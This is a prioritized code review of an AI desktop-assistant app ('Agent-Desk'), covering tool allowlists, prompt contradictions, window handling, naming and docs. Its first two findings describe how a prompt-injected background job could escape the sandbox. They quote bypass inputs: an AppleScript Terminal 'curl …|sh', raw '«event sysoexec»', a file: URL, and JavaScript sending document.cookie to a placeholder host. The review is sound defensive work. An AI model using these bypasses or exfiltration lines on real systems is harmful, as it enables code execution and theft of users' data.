# Agent-Desk review: prioritized findings (dev @ 49667a7d, after #58 universal-apps)

PR #58 (`hex_app_capabilities`, recipes removed) merged while I was reviewing, so these findings are against `49667a7d`. Line numbers refer to that commit.

## P0: breaks the experience, safety, or the in-flight PRs

1. **Security: a job can run any code outside its sandbox through `hex_app_action`.**
   - Files: `src/assistant/actions/app_action.rs:95-118`, `src/assistant/guard/proxy/actions.rs:23-100`
   - Problem: Background jobs read untrusted pages and still get this tool. `script` is wrapped in `tell application id "X" … end tell` and runs as Agent-Desk itself, with Agent-Desk's Automation and Full Disk Access. The only filter is the substring `do shell script`. These all pass it:
     - `tell application id "com.apple.Terminal" to do script "curl …|sh"`
     - an `end tell` followed by `tell application "1Password"` (the blocked-apps check only looks at `recipe.app`)
     - `«event sysoexec»`
     - `open_url` with `file:///…/x.command`
   - Why it matters: one prompt injection in a page a job reads becomes arbitrary shell outside Claude Code's sandbox, in Smart and Ask modes. The job rules say "Shell commands run sandboxed", and that is not true here.
   - Fix (one agent, `actions/app_action.rs` + `guard/proxy/actions.rs`):
     - Refuse `script` and non-http(s) `open_url` for `Role::Job` unless the mode is Yolo.
     - For turns: parse every `tell application` target and run the blocked and consent checks on each.
     - Reject `do script`, `run script`, raw `«event …»`, `file:` URLs, and `.command`/`.app` targets.
     - Add tests for each bypass listed above.

2. **Security: jobs can act in the person's own signed-in Chrome.**
   - Files: `src/assistant/tools.rs:76-113` (`NOT_FOR_JOBS` leaves out `hex_chrome_tab`), `src/assistant/knowledge/tab.rs:398-423`, `src/assistant/browser/consent.rs:291-307`
   - Problem:
     - `run` is guarded by a deny-list. `new Image().src='https://x/?'+document.cookie`, `location=…`, and `window['fe'+'tch']` all pass it.
     - `navigate` and `fill` are not gated at all.
   - Why it matters: a job prompt-injected by a research page can read the person's Gmail tab and send it out.
   - Fix:
     - Add `hex_chrome_tab` to `NOT_FOR_JOBS`, or allow jobs only `action=read`.
     - For turns, make `run` read-only by wrapping it in a frozen evaluation, or drop it and keep `read`, `click` and `fill`.
     - Gate `navigate` like a click.

3. **Codex and the Claude API backend never get the tools the prompt requires.**
   - Files: `src/assistant/provider.rs:174-215` (`DESKTOP_TOOLS`), `provider/servers.rs:63-71`, `provider/claude_api.rs:279-285`
   - Problem: the allowlist is missing `hex_app_action`, `hex_app_capabilities`, `hex_read_window`, `hex_release_window` and `hex_displays`. Meanwhile `APP_METHODS`, `DESK_NOTE`, and `actions.rs`'s refusal texts tell the model to use them.
   - Why it matters: on those backends the model is told to call tools it doesn't have, so "everything possible" fails silently.
   - Fix: build the allowlist from `Guard::tools()` / `policy::kind` (everything not `Refused` or withheld) instead of a hand list. Add a test that every `hex_*` name in `system_for` output is in each backend's allowed set.

4. **Parked windows are stranded after Agent-Desk quits, crashes, or updates.**
   - Files: `src/assistant/guard/state.rs:218` (`sweep`), `src/assistant/guard/desk.rs` (desk leases held by Agent-Desk's pid), `src/assistant/space.rs:38,137-170`, `src/assistant/guard/proxy/displays.rs:38-80,198`
   - Problem:
     - The guard parks windows in a screen corner from its own process, and remembers nothing.
     - `space::show_now` (overlay process) only knows positions it parked itself, so it falls back to main display +80,+80.
     - At startup `sweep` deletes the desk and lapsed leases and never brings windows back.
   - Why it matters: after every Pilot update, the person's WhatsApp or Mail windows hang 2 px off-screen with no mini to recover them, a hard dead end. Even without a restart, "Take over" loses the window's original place.
   - Fix (one module):
     - Write one `parking` store in the guard state dir: window id → original frame, with an exclusive file like the leases.
     - Have guard and overlay use only that store.
     - In `startup()`/`sweep()`, bring back every parked window whose lease lapsed.
     - Delete the duplicate paths in `space.rs` (`park`, `show`, `PARKED`).

5. **An escalated job's browsers are kept "on the desk" forever.**
   - Files: `src/assistant/browser.rs:410-441` (`keeps_on_desk` reads `stored.conversation.origin`), `src/assistant/agent.rs:147-149` (the stored origin is never updated)
   - Problem: most jobs start from a hold, so their stored origin stays `ActionShortcut`. When the job ends, `release` treats it as a quick turn and keeps every research session (`a`, `b`, `c`, …).
   - Why it matters: Chrome processes and minis pile up after every job (memory pressure, a cluttered orb), against "cleanup after tasks".
   - Fix: decide from the ending task's lane (pass `Lane` into `hooks.release`) or from a "desk" flag set by the guard, not from the stored origin. Add a service test for an escalated job's release.

6. **The memory graph makes the system prompt depend on the request's words, which defeats warm starts and the prompt cache.**
   - Files: `src/assistant/service/run.rs:110-115` (`knowledge::with_graph(memory, &request.text…)`), `service/warm.rs:135-141` (prewarm has no graph), `agent/rules.rs:10-24`, `knowledge.rs:314` (`cfg!(test)` returns early, so tests never see it)
   - Problem: whenever the graph matches something in the request (people, companies, projects: exactly the requests that matter), the system prompt differs from the prewarmed one. `warm_key` misses and Claude Code cold-starts. The docs and the test `a_backend_started_ahead_has_the_requests_own_system_prompt` claim the opposite.
   - Why it matters: the speed gain from two models and warm processes is lost on the most common personal requests.
   - Fix: move the graph context into `request_rules` (the message), keep the system prompt words-free, and remove the `cfg!(test)` early return so the existing test covers it.

7. **`agent.rs` and `service.rs` are at the hard size cap.**
   - Files: `src/assistant/agent.rs` (1,481 of 1,500 non-test lines), `src/assistant/service.rs` (1,471)
   - Problem: any of the three in-flight PRs that touches the prompt or the runner fails `code_shape_tests`.
   - Fix (one agent, before Cua lands):
     - Move `system_prompt`, `HERE_BROWSER`, `guide`/`trim_guide`, `language_rule`, and `prompt_with` into `agent/prompt.rs`.
     - Move the model, effort, and escalation helpers into `agent/models.rs`.
     - Move the public facade functions (lines 105-400) into `service/api.rs`.
   - No behaviour change; filtered tests only.

## P1: important

8. **Lane tool inventory: overlaps and dead weight.**
   - Sources: guard tools `guard/proxy.rs:242-277` (agent-desktop's list, plus Agent-Desk tools from `proxy/apps.rs:387`, `proxy/desk.rs:140`, `proxy/actions.rs`, `proxy/displays.rs:154`); Agent-Desk tools `tools.rs:147-218`; knowledge `knowledge.rs:114`, `knowledge/tab.rs:28`; browser via agent-browser + `browser/sessions.rs:435`; built-ins `provider/claude_code.rs:153,277`.

   | Lane | Desktop (guard) | Agent-Desk tools | Browser | Built-in |
   |---|---|---|---|---|
   | Here, full control (default) | `desktop_*` without `desktop_launch`; physical and clipboard tools allowed; `desktop_claim_window`, `hex_installed_apps`, `hex_open_app`, `hex_displays`, `hex_release_window`, `hex_app_action`, `hex_app_capabilities`, `hex_read_window` | `hex_start_jobs`, `hex_tell_job`, `hex_job_result`, `hex_remember`, `hex_schedule(s)`, `hex_unschedule`, `hex_compare_images`, `hex_lookup`, `hex_chrome_tab` | `agent_browser_*` | WebSearch, WebFetch |
   | Here, full control off | as above, but no claim, `hex_open_app`, release, or `hex_app_action` | same as above | none | same |
   | Background job | `desktop_launch` and `hex_open_app`, claim, desk release, app action, capabilities, read window, displays; no physical tools or clipboard | `hex_job_result`, `hex_schedules`, `hex_compare_images`, `hex_lookup`, `hex_chrome_tab`, team ×3 | `agent_browser_*`, `hex_browser_sessions` | plus Read, Write, Edit, Glob, Grep, Bash, Task |
   | Helper | same as job (team tools still present) | same as job | same | same |

   Overlaps and problems:
   - `hex_installed_apps`, `hex_lookup scope=apps`, and `hex_app_capabilities.default_for` all answer "which apps".
   - `desktop_launch` and `hex_open_app` both open apps.
   - `hex_compare_images` is shown to quick turns.
   - `hex_schedule.lane` is documented as "Always background in practice".
   - `hex_app_capabilities` is offered to Here without full control, but `hex_app_action` is not.

   Fix:
   - Drop the `apps` scope from `hex_lookup`.
   - Hide `desktop_launch` wherever `hex_open_app` exists.
   - Move `hex_compare_images` to `Role::Job` only.
   - Remove the `lane` parameter.
   - Show `hex_app_capabilities` only where `hex_app_action` is shown.

9. **The guard's MCP instructions contradict the system prompt.**
   - Files: `guard/proxy.rs:281-334` (`rules()`, sent as MCP instructions by `guard/server.rs:72-76`) vs `agent.rs:1376-1398`
   - Contradictions:
     - Background: the guard says "windows it opened with desktop_launch"; the system prompt says "call hex_open_app first".
     - Here, full control: the guard says "it claims one with desktop_claim_window"; the system prompt says "no need to claim it first".
   - Also: the model gets three rule sources (system prompt, agent-desktop's guide, guard instructions plus agent-desktop's own instructions).
   - Fix: reduce `Guard::rules()` to one line pointing at the system prompt, or generate both texts from one table in `agent/prompt.rs`. Drop agent-desktop's own `instructions` from the guard (the guide is already in the prompt).

10. **Contradictions when "full control" is off.**
    - Files: `agent/rules.rs:76` (`ROUTING`: "Never a job: opening… hex_open_app…") vs `agent.rs:1382`
    - Problem: with full control off, the Here prompt says "hand it off at once with `HEX_JOB:` with the hex_start_jobs tool", and `hex_open_app` isn't offered. The model is told to use a tool it lacks, and the marker and the tool are mixed in one sentence.
    - Fix: make `ROUTING` lane-aware (pass `desktop.open_apps || front_window`). In the Here branch say "call hex_start_jobs". Add a test that each prompt variant names only tools in that lane's list.

11. **Helpers get "start helpers" and "don't start helpers" in the same prompt.**
    - Files: `agent.rs:983-985` + `agent/rules.rs:115` (`team::rules`, "start that many helpers in ONE hex_team_start call") + `agent/team.rs:457-460` ("Don't start helpers of your own")
    - Problem: helpers still get the team tools (`tools.rs:100-113`).
    - Fix: skip `team::rules` when `job.helps.is_some()`. Add a `Role::Helper` without the team tools, passed via `--role helper`.

12. **Routing rules contradict each other about the browser.**
    - Files: `ROUTING` says "a browser or websites… is a job"; `HERE_BROWSER` (`agent.rs:1309`) gives quick turns a browser "for a quick look on the web"; `service/warm.rs` speculatively starts that browser.
    - Why it matters: the model flips between answering and escalating for "Schau mal kurz auf spiegel.de".
    - Fix: one sentence in `ROUTING` saying that one page or a quick look is Here and research across sources is a job. Keep it in one place.

13. **The "work fast" rules never reach jobs.**
    - Files: `agent/rules.rs:7` (`TOOLS_RULES` bundles parallel calls, read-as-text, no fixed waits, snapshot once, plus schedules), `agent.rs:995-997` (added only for turns)
    - Problem: jobs, the heavy work, never get the speed rules. The rules also name Claude-only tools (`WebFetch`, "subagents (Task)" in `job_rules`) that Codex and OpenCode don't have.
    - Fix: split into `SPEED_RULES` for all roles and `SCHEDULE_RULES` for turns only, with tool names templated per backend.

14. **The desk is shared with every Background job at once.**
    - Files: `guard/proxy/desk.rs:23-51` (`reaches_desk`, `usable`, `free_for_this_task`)
    - Problem: any Background task, including ones reading untrusted pages, acts in desk windows as if it held them, at the same time as a Here turn. Nothing makes them exclusive.
    - Why it matters: two agents typing in the same WhatsApp chat, or a job using the chat the person opened.
    - Fix: a desk window becomes usable only by taking a short, exclusive "borrow" lease (`Acquire` from DESK to the task, returned at turn or job end). Jobs need an explicit claim, refused while a Here turn holds it.

15. **The warm process is keyed per window and per task, so it is often wasted.**
    - Files: `provider/claude_code.rs:69-76` (`warm_key` includes the guard spec with `here_window`, task and agent id), `service/warm.rs:23-39,104-111`, `service.rs:1026-1037` (`state.warm.take()` consumed even when it doesn't match), `service.rs:1068-1080`
    - Problem:
      - The process `stand_by` starts misses as soon as the next hold is in another window.
      - A request that is plainly a job keeps the Here reservation's key while running as Background.
      - Every miss idles a Claude Code process for `warm_minutes` (15).
    - Fix:
      - Pass the Here window through the guard's runtime state (a file the spec points to, written at submit) instead of the spawn arguments.
      - Match `warm` before taking it.
      - Release or end the reservation on a mismatch.

16. **Two "frame" systems, one of them dead.**
    - Files: `service/session.rs:72-126` (`frame_on`, `ModeChanged`), `service.rs:225-257` (`agent_mode`, `set_agent_mode`, `frame_shown`, `background_busy`, re-exported in `assistant.rs:57-61`, no callers), `rune_ui/assistant_overlay/host.rs:388` (ignores `ModeChanged`) vs `board.rs:620-640` (frame from `Event::Acting`)
    - Problem: the docs (`types.rs:324-328`, `service.rs:15`, `interaction.rs:20`) describe the dead one.
    - Fix: delete `frame_on`, `ModeChanged`, `agent_mode`, `set_agent_mode` and `frame_shown`. Keep `background_on` only for the desktop session. Update the docs.

17. **A failed quick question is a dead end.**
    - Files: `rune_ui/assistant_overlay/bubble.rs:296-331`, `recognition/talk.rs:476-480`, `service/run.rs:346-354`, `service.rs:955-967`
    - Problem:
      - The Here bubble on failure shows only the raw English error and "Open in Chats". It has no Try again or Fix (job results do).
      - Nothing is spoken, so a voice-first person who isn't looking gets nothing.
      - `refuse()` emits `Failed` without `Started`, so `quick.rs` has no bubble and the message ("Turn on the assistant first.") is never shown.
    - Fix:
      - Classify failures (not signed in, not installed, permission, limit, crash) into a localized line plus one action (Fix opens the right settings page or repair, Try again resubmits).
      - Speak a short localized line.
      - Emit `Started` before `refuse`'s `Failed`.

18. **Wrong names in error messages and the UI.**
    - Files: `agent.rs:881`, `provider.rs:525`, `provider/claude_api.rs:31` ("Chats › Settings"); `service.rs:967` ("Settings › Assistant"); `rune_ui/sidebar.rs:129-146` (the panes are titled "Assistant" and "Assistant settings"); "Open in Chats" in `bubble.rs:324`, `live_card.rs:98`, `notify.rs:166`; "Chats…" in `macos_rune/status_item.rs:259`, `desktop/tray_menu.rs:209`
    - Problem: the errors send people to a page that doesn't exist by that name.
    - Fix: one constant per destination (`"Assistant"`, `"Assistant settings"`) used by every message, menu, and button. Rename "Open in Chats" to "Open in Agent-Desk" or "Show in Assistant". Update the i18n keys.

19. **Mixed German and English, and ad-hoc translation.**
    - Files: 17 `said_in_german` branches (e.g. `service.rs:1123-1127`), `service/context.rs:261-268` (its own German word list for `on_it`), `service/status.rs:229`. German i18n alternates "Aufgabe" and "Auftrag" ("Neue Hintergrundaufgabe" vs "Auftrag im Hintergrund", "{} Aufträge laufen").
    - Problem: messages from the brain (Stopped, failures, steer notes) bypass `tr()`.
    - Fix:
      - Route every spoken or shown line from the brain through `tr()` with the request's language from `speech::language_of`.
      - Delete `on_it`'s word list.
      - Settle on a glossary: Auftrag = job, Frage = quick turn, never "Aufgabe" for jobs. Write it down in `docs/features/assistant.md`.

20. **Per-app word lists are still used as logic in the consent check.**
    - Files: `guard/proxy/consent.rs:~20-100` (`MESSENGER…`, `MAIL_APPS`, `FILE_MANAGERS`, `DELETE_KEY_APPS`, `DELETE_APPS`, `is_one_of(app, &["finder"])` at ~397)
    - Problem: this contradicts "universal" right after #58 removed recipes.
    - Fix: before a key combo, read the target app's menu bar over Accessibility. Find the menu item whose key equivalent matches the combo and classify its title with `autonomy::classify` ("Send", "Move to Trash"). For Return in a text field, classify the default button. Remove the lists.

21. **Personal knowledge only supports Google Chrome.**
    - Files: `knowledge/chrome.rs`, `knowledge/tab.rs` (JXA `Application('Google Chrome')`), `knowledge.rs:42,60-72`, `browser/accounts.rs` (login import from a Chrome profile only)
    - Problem: people who use Safari, Arc, Edge or Brave get nothing.
    - Fix:
      - Pick the person's default browser via `actions::capabilities::launch_services()`, which already exists.
      - Use one adapter per scripting family: Chromium uses `execute javascript`, Safari uses `do JavaScript`.
      - Rename the tool and scopes to `hex_browser_tab`, `browser_tabs`, `browser_history`.

22. **Word-list routing heuristics are scattered.**
    - Files: `service/context.rs:208-257` (`looks_like_job`), `assistant.rs:121-140` (`asks_background_only`), `recognition/ask` (`spoken_background`), `agent/handoff.rs:169` (`claims_background`), `service/warm.rs:175-238` (`wants_web`)
    - Problem: these are five independent German/English lists, and they misfire on other languages. `looks_like_job` forces Background before the model sees the request.
    - Fix: put them in one `assistant::route` module with a table-driven test per language. Make `looks_like_job` opt-in or remove it, since `hex_start_jobs` already routes deterministically.

23. **The desktop backend leaks into the whole codebase (blocks the Cua Driver PR).**
    - Files: agent-desktop names appear in `agent.rs:1352-1365,1414-1440` (prompt, `--headed`, guide), `service/session.rs:141-252` (session and cursor CLI), `space.rs`, `guard/child.rs`, `backends/MCP_NAME` (the guard serves as `"agent-desktop"`, `guard/server.rs:28`), onboarding's "can use agent-desktop" gate, i18n strings, and `space::available()` requiring agent-desktop.
    - Problem: by count, 44 mentions in `backends.rs`, 38 in `check.rs`, 20 in `provider.rs`, 19 in `guard.rs`, and so on.
    - Fix (before Cua merges): a `desktop::Backend` trait (tools, guide text, session and cursor, move window, error-code map, install and check). The MCP server name becomes `desktop`, and prompt text is templated from the backend.

24. **Overlay and Assistant pane duplicate the event model and the surfaces.**
    - Files: `rune_ui/assistant_overlay/board.rs` + `quick.rs` vs `rune_ui/chats/events.rs`; task lists in `stack.rs`, `jobs.rs`, `results.rs`/`pops.rs`, `minis.rs`, `wall.rs` and `chats/strip.rs`; live pictures in `live.rs` + `app_live.rs` + `chats/live_view.rs`
    - Why it matters: each new state (Waiting, NeedsInput, a helper) has to be added twice, and they drift.
    - Fix: one `assistant::view` reducer (Event → TaskView, platform-free, unit-tested) that both surfaces read. Merge `live` and `app_live` behind one "picture source" enum.

25. **Overloaded names.**
    - `agent::Job` means any run, `JobKind::Job` means a real job, `chats::jobs` is a UI thread worker, `assistant_overlay::jobs` is job rows.
    - `guard::desk` is the person's parked windows, `assistant_overlay::desk` is a fake desktop for stories, `minis.rs` is "the person's desk".
    - `space` is corner parking, not macOS Spaces.
    - `agent::Outcome` and `types::Outcome` (imported as `Ended`).
    - Fix (rename-only PR):
      - `agent::Job` → `Run`/`TaskRun`, `JobKind` → `RunKind`.
      - `chats::jobs` → `chats::workers`, `assistant_overlay::desk` → `scene_desktop`.
      - `space` → `parking`.
      - `types::Outcome` → `Ending`.

26. **Settings are misnamed and overlap.**
    - Files: `app_settings/assistant.rs:86-105,59-61,113-115`
    - Problems:
      - `background_front_window` actually means "full control" for both lanes, and also opening apps.
      - `agent_space` says "Experimental… Space of their own" but is on by default and parks in a corner.
      - `follow_up_seconds` (120) and `conversation_seconds` (8) are two follow-up windows.
      - `physical_input` and `here_physical_input`.
    - Fix: rename with serde aliases (`full_control`, `park_windows`) and merge or explain the two follow-up windows in one settings row.

27. **A full-screen screenshot goes with every hold.**
    - Files: `app_settings/assistant.rs:181` (`include_screenshot: true`); captured in `recognition/ask.rs:144-153`, `recognition/talk.rs:298-300`, `assistant/shortcut.rs:451-455` (three copies); saved and sent in `agent.rs:167-176`
    - Problem: a PNG is encoded, saved, and sent as an image block on every quick turn, even though the desktop-now section and `desktop_screenshot` exist. That costs latency and tokens on the fast path.
    - Fix: default off, or take it on demand via the tool. Collapse the three capture sites into one `shortcut::context()`.

28. **A stuck quick turn can show "Thinking…" for 30 minutes.**
    - Files: `service/run.rs:535-540` (`task_timeout_minutes` = 30 for Here); no inactivity watchdog in `provider/*`
    - Fix: a Here inactivity limit (e.g. 45 s with no stream line or tool result) that hands over to the strong model once, then fails with a Try again.

29. **Production code switches itself off in tests, which hides critical behaviour.**
    - Files: 16 `if cfg!(test)` sites, including `knowledge.rs:315,348`, `browser.rs:420`, `guard/proxy.rs` ×3, `guard/proxy/actions.rs`, `guard/proxy/apps.rs`
    - Why it matters: findings 5 and 6 slipped through exactly these.
    - Fix: inject them as hooks (the `Hooks` pattern already used in the service). Add tests for:
      - the warm key equal between prewarm and request through `run_task`
      - an escalated job's browser closing
      - the app_action and chrome_tab bypasses
      - backend tool allowlists vs prompt
      - the Here failure bubble

## P2: polish

30. **Dead code.**
    - `space::park`/`space::show` (only tests and the probe use them)
    - `#[allow(dead_code)]` on the wired `set_toggle_tasks`/`set_open_setup` (`shortcut.rs:58,86`)
    - the `cursor.rs:58` hotspot
    - orphaned "Agent mode" i18n entries (`desktop/i18n/assistant.rs:63,69,137,173`, `i18n.rs:576`)
    - `macos_rune/control.rs:600` telling people to use "Labs › … `agent-desk labs on print-start`" (Labs is gone)
    - `allow_without_lab`/`WITHOUT_LAB` (`service.rs:386-390`) and `(lab, settings)` (`space.rs:44`)
    - `host.rs:110` "Chats isn't wired yet"
    - Fix: delete or rename in one sweep.

31. **The same logic exists more than once.**
    - `memory_on()` exists twice (`tools.rs:410`, `knowledge.rs:211`).
    - There are four consent gates: `guard/proxy/consent.rs`, `browser/consent.rs`, `knowledge/tab.rs:288`, and `app_action.rs:110`.
    - Fix: one `autonomy::Gate::check(category, target) -> Result<(), Refusal>` used by all four, with one `NEEDS_CONFIRMATION` shape.

32. **The session fingerprint is fragile.**
    - Files: `agent.rs:472-478` hashes only the text before `"\nAutonomy ("`.
    - Problem: changes to `TOOLS_RULES`, the knowledge rules, or the memory rules (all after it) never count as changed rules.
    - Fix: put an explicit `RULES_END` sentinel before the variable part, or hash `system_for` with the memory note left out.

33. **The language rules conflict.**
    - The system prompt says "Answer in the language the person used" (`agent.rs:1316`).
    - `request_rules` falls back to the Mac's language for short or ambiguous requests (`agent.rs:1282-1306`), so "open Safari" on a German Mac is told "The person speaks German".
    - Fix: keep only the per-request rule. When `language_of` returns None, say "the language of their words" instead of the system language.

34. **Brand words remain in prompts and copy.**
    - `APPS_RULES` and `team::rules` ("Excel or Numbers")
    - `project_rules` (VS Code, `gh`)
    - Citrix examples in the Here rules
    - "Like the ChatGPT app" in settings copy (`i18n/assistant.rs`)
    - Fix: derive the spreadsheet app from the LaunchServices default for `.xlsx` and the editor from the default for source files. Keep examples generic.

35. **The assistant's shortcuts live under General.**
    - Files: `rune_ui/general/shortcuts.rs:57-58`, `rune_ui/settings.rs:433-462`
    - Problem: they are not on the Assistant settings page that the pane comment promises ("its shortcuts").
    - Fix: show both recorders in Assistant settings (shared component), or link to them from there.

36. **The guard handles one tool call at a time.**
    - Files: `guard/server.rs:47-55`
    - Problem: a single `Mutex<Guard>` serializes every call. The prompt asks for parallel tool calls, but they queue behind `hex_open_app`'s window wait or the 20 s `HANDS_WAIT`.
    - Fix: run read-only kinds (`Observe`, `InstalledApps`, `AppCapabilities`, `Displays`) outside the lock against a snapshot of the leases.

37. **The docs are stale.**
    - `docs/features/assistant.md` still describes Chats, Agent mode, "Send a screenshot", "Operate apps", and "Install it in Chats › Settings".
    - `types.rs:4-5` calls itself the contract with "the Chats pane".
    - AGENTS.md has almost no assistant architecture: no module ownership map (brain, hands, knowledge, actions, overlays, browser).
    - Fix: one docs PR that adds an assistant architecture section (lanes → guard → backends → overlay) with the vocabulary from finding 25.

38. **Modules approaching the 800-line soft limit.** Watch these and split by capability next time they're touched:

    | File | Non-test lines |
    |---|---|
    | `rune_ui/assistant_overlay/host.rs` | 984 |
    | `rune_ui/assistant_overlay/board.rs` | 899 |
    | `assistant/browser.rs` | 868 |
    | `assistant/backends/install.rs` | 858 |
    | `rune_ui/assistant_overlay/orb.rs` | 854 |
    | `assistant/actions/capabilities.rs` | 851 |
    | `rune_ui/assistant_overlay/live.rs` | 809 |
    | `rune_ui/chats/setup.rs` | 1,286 |
    | `assistant/backends/check.rs` | 1,190 |
    | `assistant/guard/proxy.rs` | 1,119 |

    Suggested splits:
    - `capabilities` → `sdef.rs` + `bundle.rs`
    - `host.rs` → `host/panels.rs`
    - `guard/proxy.rs` → `proxy/call.rs` + `proxy/tools.rs`

### Critical Files for Implementation
- /Users/felix/dev/desktop/ai-desktop/src/assistant/agent.rs
- /Users/felix/dev/desktop/ai-desktop/src/assistant/guard/proxy.rs
- /Users/felix/dev/desktop/ai-desktop/src/assistant/actions/app_action.rs
- /Users/felix/dev/desktop/ai-desktop/src/assistant/provider.rs
- /Users/felix/dev/desktop/ai-desktop/src/assistant/service/run.rs